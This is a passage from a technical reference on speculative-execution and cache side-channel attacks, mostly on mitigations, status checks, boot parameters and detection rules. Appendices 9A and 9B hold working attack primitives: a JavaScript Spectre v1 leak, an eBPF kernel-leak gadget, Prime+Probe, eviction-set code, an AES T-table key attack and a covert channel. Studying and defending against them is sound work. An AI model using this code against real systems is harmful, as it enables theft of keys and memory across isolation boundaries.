**Speculative Load Hardening (SLH).** Clang's `-mspeculative-load-hardening` inserts a conditional mask (derived from the processor flags register) after every conditional branch. The mask is all-ones on the correct prediction path and all-zeros on the mispredicted path, ensuring that speculative loads on the mispredicted path use zeroed addresses and cannot access sensitive data. SLH is comprehensive but costly: it adds 2-3 instructions per conditional branch, resulting in 10-30% overhead on typical code. The kernel does not use SLH globally; it is primarily relevant for sandboxed JIT compilers (V8, SpiderMonkey) and eBPF.

**Retpoline.** GCC `-mindirect-branch=thunk`, Clang `-mretpoline`. Replaces all indirect `call` and `jmp` instructions with calls to the retpoline thunk. The compiler must also handle indirect branches generated by the linker (PLT entries) and by inline assembly. The kernel's `objtool` tool verifies that all indirect branches in the compiled kernel go through retpoline thunks.

**`lfence` insertion.** Compilers can insert `lfence` after conditional branches to serialize speculation. The MSVC `/Qspectre` flag does this for a subset of recognized Spectre v1 patterns. GCC and Clang rely on manual annotation (`barrier_nospec()`) rather than automatic `lfence` insertion.

**LLVM `spectreobfuscate` pass.** An experimental LLVM pass that replaces speculative-path-reachable loads with sequences that zero the loaded value on the mispredicted path, using conditional-move chains derived from the branch condition's data dependency. This approach is more targeted than SLH (which instruments every branch) but requires static analysis to identify which loads are speculative-path-reachable from security-sensitive branches. The pass is not yet production-quality and is not used in mainline kernels or browsers, but it represents the direction of future compiler-level Spectre mitigation: selectively hardening only the paths that are reachable from attacker-influenced branches, minimizing performance impact.

**WASM and JIT-specific mitigations.** WebAssembly runtimes (V8, SpiderMonkey, Wasmtime) insert `lfence` or equivalent serialization at indirect-branch targets within JIT-compiled Wasm code. V8 additionally "pinches" the register file at security-critical boundaries (e.g., sandbox transitions), zeroing general-purpose registers to prevent speculative leakage of cross-sandbox values through register state. SpiderMonkey uses a different strategy: it inserts index masking (equivalent to `array_index_nospec`) on all Wasm linear-memory accesses, ensuring that even speculative out-of-bounds loads are clamped to the Wasm memory region.

### 9.3 Hardware mitigations

**Intel CET-IBT (Control-flow Enforcement Technology — Indirect Branch Tracking).** CET-IBT adds an `ENDBRANCH` instruction that must be the first instruction at any valid indirect branch target. If an indirect `call` or `jmp` lands on an instruction that is not `ENDBRANCH`, the CPU raises a #CP (Control Protection) exception. While CET-IBT's primary purpose is forward-edge CFI (preventing ROP/JOP), it limits the Spectre v2 gadget space by restricting where speculative execution can land — only `ENDBRANCH`-tagged locations are valid, reducing the set of exploitable gadgets. Linux 6.2+ supports CET-IBT for the kernel (with `ibt=on`).

**Intel CET-SHSTK (Shadow Stack).** CET-SHSTK provides a hardware shadow stack that records return addresses on a separate, protected stack. On `ret`, the CPU compares the return address on the data stack with the shadow stack; a mismatch raises #CP. This mitigates Spectre-RSB by preventing an attacker from influencing the `ret` target via stack manipulation. However, the speculative prediction still comes from the RSB, so SHSTK primarily catches architectural ROP rather than speculative RSB poisoning; RSB stuffing remains necessary for the speculative case.

**In-silicon Meltdown fix (post-Whiskey Lake/Coffee Lake Refresh).** Starting with Ice Lake (10nm) and Comet Lake (some SKUs), Intel CPUs enforce speculative permission checks: a load that would fault returns zero for the speculative value rather than the actual data. This eliminates the Meltdown data leakage without software mitigation. When this hardware fix is detected, the kernel disables KPTI (printing `Spectre v2 : Mitigation: Enhanced IBRS; pti: Disabled` in dmesg).

**AMD Predictive Store Forwarding Disable (PSFD).** AMD Zen 3+ processors support PSFD, a feature that disables predictive store-to-load forwarding (AMD's variant of speculative store bypass). PSFD is controlled via MSR `SPEC_CTRL` bit 7 and is the AMD-specific analogue of Intel's SSBD. The kernel enables PSFD for processes that request SSB mitigation via `prctl` on AMD hardware.

### 9.4 Checking mitigation status

**Sysfs vulnerability interface.** The kernel exposes per-vulnerability status in `/sys/devices/system/cpu/vulnerabilities/`:

```
$ cat /sys/devices/system/cpu/vulnerabilities/spectre_v1
Mitigation: usercopy/swapgs barriers and __user pointer sanitization

$ cat /sys/devices/system/cpu/vulnerabilities/spectre_v2
Mitigation: Enhanced IBRS; IBPB: conditional; RSB filling; PBRSB-eIBRS: SW sequence; BHI: SW loop, KVM: SW loop

$ cat /sys/devices/system/cpu/vulnerabilities/meltdown
Not affected

$ cat /sys/devices/system/cpu/vulnerabilities/spec_store_bypass
Mitigation: Speculative Store Bypass disabled via prctl

$ cat /sys/devices/system/cpu/vulnerabilities/l1tf
Not affected

$ cat /sys/devices/system/cpu/vulnerabilities/mds
Not affected

$ cat /sys/devices/system/cpu/vulnerabilities/tsx_async_abort
Not affected

$ cat /sys/devices/system/cpu/vulnerabilities/mmio_stale_data
Not affected

$ cat /sys/devices/system/cpu/vulnerabilities/retbleed
Not affected

$ cat /sys/devices/system/cpu/vulnerabilities/spec_rstack_overflow
Not affected

$ cat /sys/devices/system/cpu/vulnerabilities/gather_data_sampling
Not affected
```

**`lscpu` output.** The `lscpu` command includes a `Vulnerability` section that mirrors the sysfs entries:

```
Vulnerability Spectre v1:   Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:   Mitigation; Enhanced IBRS, IBPB conditional, RSB filling, ...
Vulnerability Meltdown:     Not affected
```

**`spectre-meltdown-checker` tool.** A comprehensive shell script (https://github.com/speed47/spectre-meltdown-checker) that checks CPU microcode version, kernel configuration, and sysfs entries to report the status of all known speculative-execution vulnerabilities. It tests for Spectre v1, v2, Meltdown, SSB, L1TF, MDS, TAA, SRBDS, and newer vulnerabilities. The tool reports whether each vulnerability is mitigated, and if not, which mitigation is missing (microcode update, kernel config, boot parameter).

Example output (abbreviated):

```
$ sudo ./spectre-meltdown-checker.sh
Spectre and Meltdown mitigation(s) status for Linux 6.8.0-45 on Intel Core i9-13900K:

CVE-2017-5753 [Spectre v1] - Bounds Check Bypass
  * Mitigated: yes (Kernel compiled with LFENCE, usercopy barriers)
CVE-2017-5715 [Spectre v2] - Branch Target Injection
  * Mitigated: yes (Enhanced IBRS + IBPB conditional + RSB filling + BHI SW loop)
CVE-2017-5754 [Meltdown] - Rogue Data Cache Load
  * Not affected (hardware not vulnerable)
CVE-2018-3639 [Spectre v4] - Speculative Store Bypass
  * Mitigated: yes (SSBD via prctl)
CVE-2022-0001 [Spectre-BHB] - Branch History Injection
  * Mitigated: yes (BHI SW loop on kernel entry)
```

**Kernel `dmesg` messages.** The kernel logs its mitigation selections at boot. Relevant lines can be extracted with:

```
$ dmesg | grep -i -E 'spectre|meltdown|pti|retpoline|ibrs|ssbd|mds'
[    0.038723] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.038724] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.038725] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.038726] Spectre V2 : Spectre BHI mitigation: SW BHB clearing sequence
[    0.038727] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
```

### 9.5 Linux kernel boot parameters

The kernel provides fine-grained control over mitigations via boot parameters:

```
mitigations=auto|off|auto,nosmt
```

`mitigations=off` disables all CPU vulnerability mitigations — exposing the system to all speculative-execution attacks but eliminating all performance overhead. This is sometimes used in benchmarking or in environments where the threat model does not include local code execution by untrusted users.

```
spectre_v2=on|off|auto|retpoline|retpoline,generic|retpoline,lfence|eibrs|eibrs,retpoline|eibrs,lfence
```

Controls the Spectre v2 mitigation strategy. `eibrs` uses Enhanced IBRS alone; `eibrs,retpoline` uses eIBRS with retpoline as fallback; `retpoline` uses pure retpoline without hardware IBRS.

```
spectre_v2_user=on|off|auto|prctl|seccomp
```

Controls user-to-user Spectre v2 mitigation (IBPB and STIBP for user processes). `seccomp` enables STIBP/IBPB only for seccomp-sandboxed processes.

```
pti=on|off|auto
```

Controls KPTI. `auto` enables KPTI only on Meltdown-vulnerable CPUs. `off` disables KPTI unconditionally.

```
spec_store_bypass_disable=on|off|auto|prctl|seccomp
```

Controls SSBD. Same semantics as described in §5.2.

```
spectre_bhi=on|off|auto
```

Controls the Spectre-BHB mitigation (BHB clear sequence on kernel entry).

```
nosmt
```

Disables Simultaneous Multi-Threading (hyper-threading). Eliminates all SMT-based side channels (TLBleed, port contention, L1 cache sharing between hyper-threads) at the cost of losing ~20-30% throughput on SMT-capable workloads.

```
l1tf=full|full,force|flush|flush,nosmt|flush,nowarn|off
```

Controls L1 Terminal Fault (Foreshadow) mitigation. Detailed in Chapter 7B.

```
tsx=on|off|auto
```

Controls Intel Transactional Synchronization Extensions. TSX can be used to suppress faults in Meltdown-type attacks (the transactional abort suppresses the page fault without delivering a signal, enabling faster and stealthier exploitation). Disabling TSX eliminates the TSX-based Meltdown fast path and also mitigates TAA (TSX Asynchronous Abort). The `auto` setting disables TSX on CPUs known to be affected by TAA.

```
kvm.nx_huge_pages=on|off|auto
```

Controls the KVM mitigation for iTLB-multihit (a vulnerability where a guest can crash the host by creating specific huge-page TLB configurations). When enabled, KVM breaks huge pages mapped for guest physical memory into 4 KB pages, preventing the iTLB multihit condition at the cost of TLB efficiency.

### 9.6 Performance impact quantification

Measured overhead per mitigation on representative workloads (Intel Skylake, Linux 5.15, geometric mean across kernel compilation, Redis, PostgreSQL OLTP, Nginx, and UnixBench):

| Mitigation | Microbenchmark (syscall latency) | Real-world (mixed) |
|---|---|---|
| KPTI (without PCID) | +46% | +18-30% |
| KPTI (with PCID) | +12% | +3-7% |
| Retpoline | +8% | +2-5% |
| eIBRS (replacing retpoline) | +1% | <1% |
| IBPB on context switch | +5% (per switch) | +1-3% |
| STIBP | +20% (SMT workloads) | +5-15% |
| SSBD (global) | +4% | +2-4% |
| RSB stuffing | +2% (per switch) | <1% |
| All mitigations combined | +60% (syscall) | +10-25% |
| `mitigations=off` (none) | baseline | baseline |

These numbers vary significantly by workload type. I/O-bound applications that perform millions of syscalls per second (Redis, database engines) suffer the most from KPTI and IBPB. Compute-bound applications with few syscalls see minimal impact even with all mitigations enabled.

### 9.7 Kernel implementation details

The kernel's mitigation logic lives primarily in `arch/x86/kernel/cpu/bugs.c`. This file detects CPU capabilities and vulnerabilities at boot, selects the appropriate mitigation for each vulnerability based on CPU family, microcode version, and boot parameters, and registers the sysfs entries for runtime inspection.

Key functions:

- `spectre_v1_select_mitigation()` — enables `array_index_mask_nospec` and SWAPGS barriers.
- `spectre_v2_select_mitigation()` — selects between retpoline, IBRS, eIBRS, or eIBRS+retpoline based on CPU features and the `spectre_v2=` boot parameter.
- `ssb_select_mitigation()` — configures SSBD mode (global, prctl, seccomp, off).
- `l1tf_select_mitigation()` — configures L1TF (Foreshadow) defenses.
- `mds_select_mitigation()` — configures MDS buffer-clearing on kernel exit.

The `x86_spec_ctrl_base` variable holds the base value of `IA32_SPEC_CTRL` MSR that is written on every kernel entry. Bits are set per mitigation: bit 0 (IBRS), bit 1 (STIBP), bit 2 (SSBD). On context switch, the kernel may modify additional bits per-process (e.g., enabling SSBD for sandboxed processes and disabling it for trusted ones), using `write_spec_ctrl_current()` in the scheduler path.

The entry/exit trampoline code in `arch/x86/entry/entry_64.S` contains the IBPB issuing logic (on context switch when the new task requires it), the RSB stuffing macro (`FILL_RETURN_BUFFER`), and the BHB clearing sequence (a loop of `jmp` instructions that feed known history into the BHB). These are performance-critical: a single extra MSR write in the syscall path costs ~150 cycles, which at millions of syscalls per second translates to measurable throughput loss.

### 9.8 Cloud and virtualization considerations

Cloud providers face the aggregate of all speculative-execution threats because multiple tenants share physical CPUs. The standard hardening posture:

- **VM-level isolation.** IBPB on every VM exit (preventing guest-to-host BTB poisoning). eIBRS or retpoline in the hypervisor. L1D flush on VM entry (clearing L1 data cache to prevent L1TF cross-tenant leakage). MDS buffer clearing on VM transition.
- **SMT isolation.** Disable SMT for high-security workloads (eliminating TLBleed, port contention, L1/L2 sharing channels). AWS offers `metal` instances for workloads that require hardware-level isolation; Azure offers dedicated hosts. Core scheduling (Linux 5.14+) provides a middle ground: the scheduler ensures that only mutually-trusting threads share a physical core, preserving SMT throughput for trusted multi-threaded workloads while isolating between security domains.
- **Cache partitioning.** Intel Cache Allocation Technology (CAT/RDT) allows partitioning the LLC into non-overlapping regions assigned to different VMs or containers. This defends against LLC-based PRIME+PROBE but not against L1/L2 sharing (which requires SMT isolation) or DRAM-level channels.
- **Microcode updates.** Cloud providers deploy microcode updates fleet-wide within days of release. AWS, GCP, and Azure all publish vulnerability-specific advisories detailing which mitigations are enabled for each instance type.
- **Performance overhead budget.** Cloud providers accept the aggregate mitigation overhead (typically 10-20% on I/O-intensive workloads) as a necessary security cost. Some providers offer `mitigations=off` as an opt-in for workloads that exclusively run trusted code (e.g., single-tenant bare-metal instances). AWS Nitro instances push much of the I/O path out of the host kernel into dedicated hardware, reducing the syscall overhead and thus the impact of KPTI and IBPB on the I/O-critical path.

---

## 9A. Spectre v1 PoC code

The complete C proof-of-concept for Spectre v1 bounds-check bypass with Flush+Reload recovery is in §2.2. The Flush+Reload timing measurement implementation is in §7.1. This section provides additional variant PoCs not covered above.

### 9A.1 Flush+Reload timing with auto-calibration

Extends the §7.1 primitives with automatic threshold calibration (midpoint of 1000 cached vs uncached samples):

```c
#include <stdint.h>
#include <x86intrin.h>

static int calibrated_threshold = 0;

static inline uint64_t timed_access(volatile void *addr) {
    unsigned int aux;
    uint64_t t0 = __rdtscp(&aux);
    asm volatile("" ::: "memory");
    (void)*(volatile uint8_t *)addr;
    return __rdtscp(&aux) - t0;
}

void calibrate_threshold(void *buf) {
    uint64_t hit_sum = 0, miss_sum = 0;
    volatile uint8_t *p = buf;
    for (int i = 0; i < 1000; i++) {
        (void)*p;   hit_sum  += timed_access(p);
        _mm_clflush((void *)p); _mm_mfence();
        miss_sum += timed_access(p);
    }
    calibrated_threshold = (int)((hit_sum + miss_sum) / 2000);
}
```

### 9A.2 JavaScript variant (SharedArrayBuffer timer)

Before Cross-Origin Isolation requirements, this ran in any browser context. Post-mitigation it requires `Cross-Origin-Opener-Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp` headers.

```javascript
/* --- high-resolution timer via SharedArrayBuffer worker --- */
const sab = new SharedArrayBuffer(8);
const timer = new BigInt64Array(sab);
const worker = new Worker(URL.createObjectURL(new Blob([`
  const t = new BigInt64Array(new SharedArrayBuffer(8));
  onmessage = e => { self.t = new BigInt64Array(e.data); };
  // tight increment loop — sub-ns effective resolution
  while (true) Atomics.add(t, 0, 1n);
`], { type: 'text/javascript' })));
worker.postMessage(sab);

function now() { return Atomics.load(timer, 0); }

/* --- spectre v1 gadget via speculative type confusion --- */
const PROBE_STRIDE = 4096;
const probeArray = new Uint8Array(256 * PROBE_STRIDE);
const victimArray = new Uint8Array(16);
const victimSize  = victimArray.length;

function victim(idx) {
    if (idx < victimSize) {
        // speculative OOB read encodes into probeArray
        return probeArray[victimArray[idx] * PROBE_STRIDE];
    }
    return 0;
}

function leakByte(maliciousIdx) {
    const scores = new Int32Array(256);
    for (let tries = 0; tries < 500; tries++) {
        for (let i = 0; i < 256; i++) probeArray[i * PROBE_STRIDE] = 0;
        for (let j = 0; j < 30; j++) {
            victim((j % 6 === 0) ? maliciousIdx : (tries % victimSize));
        }
        for (let i = 1; i < 256; i++) {
            const t0 = now(), _ = probeArray[i * PROBE_STRIDE];
            if (now() - t0 < 3n) scores[i]++;
        }
    }
    return scores.indexOf(Math.max(...scores));
}
```

Demonstrated by Google Project Zero (Spectre PoC #3) and leaky.page (see §9D.5). Browser mitigations: timer degradation, Site Isolation, SAB gating behind COOP/COEP.

### 9A.3 eBPF variant (kernel address leak)

Before `kernel.unprivileged_bpf_disabled=1` became the default, an unprivileged eBPF program could bypass the verifier's bounds checks speculatively:

```c
/* Simplified BPF bytecode representation — illustrative, not loadable as-is.
   The verifier passes this because the bounds check is architecturally correct,
   but the branch predictor can be trained to mispredict the check. */

// r6 = attacker-controlled map value (index)
// r7 = pointer to BPF map containing probe array (256 * 4096 bytes)
// r8 = array1_size (loaded from map)

BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_9, 0),     // r8 = *r9 (array_size)
BPF_JMP_REG(BPF_JGE, BPF_REG_6, BPF_REG_8, 4),    // if r6 >= r8 goto skip
// --- speculative path on misprediction ---
BPF_LDX_MEM(BPF_B, BPF_REG_0, BPF_REG_6, 0),      // r0 = *(u8 *)r6  (OOB!)
BPF_ALU64_IMM(BPF_LSH, BPF_REG_0, 12),             // r0 <<= 12
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),      // r0 += probe_base
BPF_LDX_MEM(BPF_B, BPF_REG_0, BPF_REG_0, 0),      // tmp = *r0 (encode in cache)
// skip:
BPF_MOV64_IMM(BPF_REG_0, 0),
BPF_EXIT_INSN(),
```

The attacker trains the conditional jump (`BPF_JGE`) by invoking the BPF program repeatedly with in-bounds values, then supplies an out-of-bounds `r6` pointing to a kernel address. The speculative path reads the kernel byte and encodes it via the probe array. Recovery uses Flush+Reload from user space on the shared probe-array pages.

Mitigations: (1) `kernel.unprivileged_bpf_disabled=1` (default since Linux 5.16), (2) `lfence` insertion in JIT after bounds checks, (3) `array_index_nospec()` in BPF map lookup, (4) speculative-aware verifier tracking.

---

## 9B. Cache timing attack code

### 9B.1 Prime+Probe implementation

The Flush+Reload implementation is in §7.1. Prime+Probe does not require shared memory — the attacker primes and probes LLC cache sets with attacker-owned addresses.

```c
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>

#define LLC_WAYS        16
#define LINE_SIZE       64
#define SETS            2048
#define THRESHOLD       150   /* LLC miss threshold in cycles */

/* An eviction set: LLC_WAYS addresses mapping to the same cache set */
typedef struct {
    volatile uint8_t *addrs[LLC_WAYS];
} eviction_set_t;

/* Prime: load all ways of the target set with attacker data */
void prime(eviction_set_t *es) {
    for (int w = 0; w < LLC_WAYS; w++)
        (void)*es->addrs[w];
    _mm_mfence();
}

/* Probe: re-access each way and measure timing.
   Returns bitmask of evicted ways (victim accessed this set). */
uint32_t probe(eviction_set_t *es) {
    uint32_t evicted = 0;
    unsigned int aux;
    for (int w = 0; w < LLC_WAYS; w++) {
        uint64_t t0 = __rdtscp(&aux);
        (void)*es->addrs[w];
        uint64_t dt = __rdtscp(&aux) - t0;
        if (dt > THRESHOLD) evicted |= (1u << w);
    }
    return evicted;
}
```

### 9B.2 Eviction set construction (minimal eviction set)

O(n) reduction algorithm based on Liu et al. (S&P 2015) — see §7.2 for the theoretical description:

```c
#include <stdbool.h>

bool test_eviction(volatile uint8_t **set, int n, volatile uint8_t *target) {
    (void)*target; _mm_mfence();
    for (int i = 0; i < n; i++) (void)*set[i];
    _mm_mfence();
    unsigned int aux;
    uint64_t t0 = __rdtscp(&aux);
    (void)*target;
    return (__rdtscp(&aux) - t0) > THRESHOLD;
}

/* Reduce pool to minimal eviction set (LLC_WAYS members) */
int find_minimal_eviction_set(
    volatile uint8_t **pool, int pool_size,
    volatile uint8_t *target, volatile uint8_t **result)
{
    int wsize = pool_size, found = 0;
    for (int i = 0; i < wsize && found < LLC_WAYS; ) {
        volatile uint8_t *saved = pool[i];
        pool[i] = pool[--wsize];           /* try removing candidate i */
        if (!test_eviction(pool, wsize, target)) {
            pool[wsize] = pool[i];         /* removal broke eviction — keep */
            pool[i] = saved; wsize++;
            result[found++] = saved;
            pool[i] = pool[--wsize];       /* now permanently remove */
        }
        i++;
    }
    return found;
}
```

### 9B.3 AES T-table cache attack

Classic last-round T-table attack against AES with lookup tables (applies to pre-AES-NI implementations). The attacker monitors L1 cache lines used by T-table lookups during encryption:

```c
/* Each T-table has 256 4-byte entries = 16 cache lines (64B each).
   Probe which lines were accessed to recover 4 bits per key byte. */
#define T_TABLE_LINES  16

void aes_cache_attack_round(
    volatile uint8_t *t_table_base, int results[4][T_TABLE_LINES])
{
    for (int t = 0; t < 4; t++)
        for (int l = 0; l < T_TABLE_LINES; l++)
            _mm_clflush((void *)(t_table_base + t * 1024 + l * 64));
    _mm_mfence();
    /* --- trigger victim encryption here --- */
    unsigned int aux;
    for (int t = 0; t < 4; t++)
        for (int l = 0; l < T_TABLE_LINES; l++) {
            volatile uint8_t *a = t_table_base + t * 1024 + l * 64;
            uint64_t t0 = __rdtscp(&aux); (void)*a;
            if (__rdtscp(&aux) - t0 < CACHE_HIT_THRESHOLD) results[t][l]++;
        }
    /* Most-hit line per table reveals key byte upper 4 bits.
       Full recovery: ~2^16 encryptions with known plaintext. */
}
```

Obsoleted by AES-NI (constant-time hardware AES), but still relevant on embedded/IoT with software AES.

### 9B.4 Covert channel via cache timing

Sender and receiver cooperate using Flush+Reload on a shared memory region. Bandwidth: ~600 KB/s with <1% error (see §7.5 for bandwidth comparison table).

```c
#define BIT_WINDOW_US  10

/* --- sender: load = '1', flush = '0' --- */
void send_bit(volatile uint8_t *shared, int bit) {
    if (bit) (void)*shared;
    else { _mm_clflush((void *)shared); _mm_mfence(); }
    usleep(BIT_WINDOW_US);
}
void send_byte(volatile uint8_t *shared, uint8_t byte) {
    for (int b = 7; b >= 0; b--) send_bit(shared, (byte >> b) & 1);
}

/* --- receiver: flush, wait, probe --- */
int receive_bit(volatile uint8_t *shared) {
    _mm_clflush((void *)shared); _mm_mfence();
    usleep(BIT_WINDOW_US);
    unsigned int aux; uint64_t t0 = __rdtscp(&aux);
    (void)*shared;
    return (__rdtscp(&aux) - t0 < CACHE_HIT_THRESHOLD) ? 1 : 0;
}
uint8_t receive_byte(volatile uint8_t *shared) {
    uint8_t b = 0;
    for (int i = 7; i >= 0; i--) b |= (receive_bit(shared) << i);
    return b;
}
```

---

## 9C. Mitigation verification tools

The sysfs vulnerability interface (`/sys/devices/system/cpu/vulnerabilities/*`), `lscpu` vulnerability output, and `spectre-meltdown-checker` usage are covered in §9.4. This section covers platforms and checks not addressed there.

### 9C.1 Windows: SpeculationControl PowerShell module

```powershell
Install-Module -Name SpeculationControl -Force
Get-SpeculationControlSettings
# Key fields: BTIHardwarePresent, BTIWindowsSupportEnabled (Spectre v2),
# KVAShadowRequired/Enabled (KPTI/Meltdown), SSBDHardwarePresent/Enabled,
# L1TFHardwareVulnerable, MDSWindowsSupportEnabled

# Scripted audit
$r = Get-SpeculationControlSettings
if (-not $r.BTIWindowsSupportEnabled) { Write-Warning "Spectre v2 NOT mitigated" }
if ($r.KVAShadowRequired -and -not $r.KVAShadowWindowsSupportEnabled) {
    Write-Warning "KPTI required but NOT enabled"
}
```

### 9C.2 Intel TSX status checking

```bash
# Check if TSX is disabled via kernel parameter
dmesg | grep -i tsx
# Expected: "TSX disabled by default" or "TSX: disabled"

# Check cpuid flags
grep -o 'rtm\|hle' /proc/cpuinfo | sort -u
# rtm = Restricted Transactional Memory (TSX), hle = Hardware Lock Elision
# Empty output = TSX disabled or not supported

# Verify via boot params
cat /proc/cmdline | grep -oP 'tsx=\w+'
```

### 9C.3 Compiler mitigation verification with objdump

```bash
# Verify retpoline thunks are present in kernel or binary
objdump -d vmlinux | grep -c '__x86_indirect_thunk'
# Non-zero = retpoline enabled

# Verify lfence insertion after bounds checks
objdump -d vmlinux | grep -B2 'lfence' | head -40

# Check for Speculative Load Hardening (SLH) — Clang only
# SLH inserts cmov chains after every conditional branch
objdump -d target_binary | grep -c 'cmovae\|cmovb'

# Verify CET-IBT endbranch markers
objdump -d vmlinux | grep -c 'endbr64'
# Non-zero = CET Indirect Branch Tracking enabled

# Check retpoline in a specific function
objdump -d vmlinux --disassemble=do_syscall_64 | grep -E 'call.*thunk|jmp.*thunk'
```

---

## 9D. Microarchitectural attack tools

### 9D.1 Mastik toolkit

Mastik (https://github.com/0xADE1A1DE/Mastik) provides production-quality implementations of multiple cache side-channel techniques:

- **FR (Flush+Reload):** Monitors specific cache lines in shared memory. Used for cryptographic key extraction from shared libraries.
- **PP (Prime+Probe):** Monitors entire LLC cache sets without shared memory. Cross-VM capable.
- **ET (Evict+Time):** Measures victim execution time change when specific cache sets are evicted. Useful on ARM without `clflush`.
- **FF (Flush+Flush):** Covert channel variant measuring `clflush` timing. Low noise.

```bash
# Build
git clone https://github.com/0xADE1A1DE/Mastik && cd Mastik
./configure && make

# Example: Flush+Reload spy on libgcrypt AES
./demo/FR-gnupg-1.4.13 /usr/lib/x86_64-linux-gnu/libgcrypt.so.20
```

### 9D.2 CacheOut / RIDL / MDS frameworks

- **RIDL:** MDS exploitation — reads stale data from line fill buffers, load ports, store buffers. PoC: https://mdsattacks.com.
- **CacheOut (L1DES):** Reverses MDS buffer-clearing by forcing L1D evictions to leak LFB contents. PoC: https://cacheoutattack.com.
- **TAA:** MDS via TSX transactional aborts. Mitigated by `tsx=off` + microcode.

### 9D.3 SGX-Step

Controlled single-stepping via local APIC timer — instruction-level enclave side-channel extraction. Combined with page-table manipulation for deterministic control flow recovery. Full analysis in Chapter 7B §1. Repo: https://github.com/jovanbulck/sgx-step.

### 9D.4 xlate

Page-table side-channel framework (controlled-channel attacks). Malicious OS marks victim pages not-present, observes fault patterns to infer memory access sequence. Primarily for SGX enclave attacks. Repo: https://github.com/peterferrie/xlate.

### 9D.5 leaky.page

Interactive browser Spectre v1 demo (https://leaky.page): SAB timer construction, speculative type confusion in JIT, cross-origin leak via speculative bounds bypass. Requires Chrome with SAB enabled or Cross-Origin Isolation headers.

---

## 9E. Detection engineering

### 9E.1 Sigma rules

```yaml
title: High-Frequency rdtsc in User Process
id: a3f7b2c1-9d4e-4f8a-b6c5-1e2d3f4a5b6c
status: experimental
description: Anomalous rdtsc/rdtscp rate — cache timing measurement indicator
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        EventType: 'perf_counter'
        CounterName: 'instructions:u'
    filter_rdtsc:
        CommandLine|contains: ['rdtsc', 'rdtscp']
    condition: selection and filter_rdtsc
level: medium
tags: [attack.credential_access, attack.t1003, cve.2017.5753]
```

```yaml
title: Cache Miss Ratio Anomaly (Side-Channel Indicator)
id: b4e8c3d2-ae5f-5a9b-c7d6-2f3e4a5a6c7d
status: experimental
description: Cache-miss/reference ratio >80% with short duration — Prime+Probe / F+R indicator
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        EventType: 'perf_event_open'
    filter_high_miss_ratio:
        CacheMissRatio|gte: 0.8
        Duration|lte: 1000
    condition: selection and filter_high_miss_ratio
level: high
tags: [attack.collection, attack.t1005]
```

```yaml
title: Unprivileged eBPF Program Load
id: c5f9d4e3-bf60-6a0c-d8e7-3a4f5a6b7d8e
status: experimental
description: Non-root BPF_PROG_LOAD — speculative kernel memory access vector
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Syscall: 'bpf'
        BPFCommand: ['BPF_PROG_LOAD']
    filter_unprivileged:
        User|not: 'root'
    condition: selection and filter_unprivileged
level: critical
tags: [attack.privilege_escalation, attack.t1068, cve.2017.5753]
```

### 9E.2 YARA rules

```yara
rule Spectre_V1_PoC_Binary {
    meta:
        description = "Compiled Spectre v1 PoC — clflush+rdtscp+probe pattern in ELF"
        cve = "CVE-2017-5753"
    strings:
        $clflush = { 0F AE (38|39|3A|3B|3C|3D|3E|3F) }
        $rdtscp  = { 0F 01 F9 }
        $mfence  = { 0F AE F0 }
        $s1 = "probe" ascii
        $s2 = "spectre" ascii nocase
        $s3 = "THRESHOLD" ascii
    condition:
        uint32(0) == 0x464C457F and #rdtscp >= 2 and
        #clflush >= 1 and $mfence and 1 of ($s*)
}

rule Cache_Timing_Source {
    meta:
        description = "Source code with cache timing measurement patterns"
    strings:
        $a = "__rdtscp" ascii
        $b = "_mm_clflush" ascii
        $c = "x86intrin.h" ascii
        $d = /CACHE_HIT_THRESHOLD\s+\d+/ ascii
        $e = /probe.{0,10}array\[.{0,30}\*\s*(512|4096|PAGE)/ ascii
    condition:
        3 of them
}
```

### 9E.3 Hardware performance counter monitoring

```bash
# Monitor cache attack indicators — high miss rate with low reference count
# indicates targeted probing rather than normal cache pressure
perf stat -e cache-misses,cache-references,L1-dcache-load-misses,\
LLC-load-misses,LLC-loads -p $TARGET_PID -- sleep 10

# Threshold: cache-miss/cache-reference ratio > 80% sustained
# with LLC-load-misses/LLC-loads > 50% is anomalous

# Continuous monitoring with interval output
perf stat -e cache-misses,cache-references -I 1000 -p $TARGET_PID

# Record for offline analysis — captures branch mispredictions too
perf record -e cache-misses,branch-misses,instructions -p $TARGET_PID -g -- sleep 30
perf report --stdio
```

### 9E.4 Intel PEBS/LBR for speculative execution monitoring

```bash
# PEBS (Precise Event-Based Sampling): captures exact IP of cache events
perf record -e cpu/event=0xd1,umask=0x01,precise=2/pp -p $PID -- sleep 10
# event 0xd1 umask 0x01 = MEM_LOAD_RETIRED.L1_HIT on Intel

# LBR (Last Branch Record): trace branch history for BTB analysis
perf record --branch-filter any,u -p $PID -- sleep 10
perf report --branch-history

# Detect abnormal branch misprediction rates (Spectre v2 training indicator)
perf stat -e branch-misses,branches -p $PID -- sleep 5
# Normal: <2% miss rate. >10% sustained may indicate BTB training activity.
```

---

## 9F. Hardening configuration

### 9F.1 Linux kernel boot parameters (comprehensive)

```bash
# Full hardening — append to GRUB_CMDLINE_LINUX in /etc/default/grub
spectre_v1=on spectre_v2=on,eibrs spec_store_bypass_disable=on \
spectre_bhi=on l1tf=flush,nosmt mds=full,nosmt tsx=off \
kvm.nx_huge_pages=force nosmt mitigations=auto,nosmt \
pti=on retbleed=auto srbds=on mmio_stale_data=full
```

Individual parameter reference (those not already detailed in §9.5):

| Parameter | Values | Effect |
|---|---|---|
| `retbleed=auto\|off\|unret\|ibpb` | Retbleed (CVE-2022-29900/29901) mitigation for AMD Zen 1/2 | `unret` = untrain-return, `ibpb` = flush on privilege transition |
| `srbds=on\|off` | Special Register Buffer Data Sampling mitigation | Microcode-dependent |
| `mmio_stale_data=full\|off` | MMIO stale data (processor MMIO register read) | Clears CPU buffers on kernel exit |
| `gather_data_sampling=force\|off` | GDS/Downfall (CVE-2022-40982) | Microcode mitigation for AVX gather |

### 9F.2 Compiler flags

```bash
